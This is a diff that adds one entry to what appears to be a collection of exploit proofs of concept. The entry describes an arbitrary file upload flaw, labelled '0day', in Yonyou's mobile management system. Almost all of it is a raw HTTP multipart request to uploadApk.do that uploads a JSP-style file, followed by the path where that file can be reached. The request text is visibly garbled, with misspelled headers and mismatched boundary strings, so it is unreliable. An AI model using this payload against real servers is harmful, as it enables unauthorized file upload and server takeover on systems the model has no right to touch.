@@ -1,0 +1,7 @@
+vendor = "用友"
+name = "用友移动管理系统uploadApk.do任意文件上传漏洞"
+type = "任意文件上传"
+source = "TG"
+date = "08.11"
+poc = "POST /maportal/appmanager/uploadApk.do?pk obj= HTTP/1.1Host: Content-Type: multipart/form-data;boundarv=----WebKitFormBoundarvyLTG6zX0aZ8LZ03User-Aaent: Mozilla/50 (Macintosh: Inte Mac OS X10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;g=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.serverConnection: cose -----WebKitFormBoundaryvLTG6zlX0gZ8LZ03Content-Disposition: form-data; name=\"downloadpath\"，filename=\"ajsp\"Content-Type: application/msword hello------WebKitFormBoundaryvLTG6zlX0gZ8LzO3-- 访问路径/maupload/apk/ajsp"
+label = "0day"
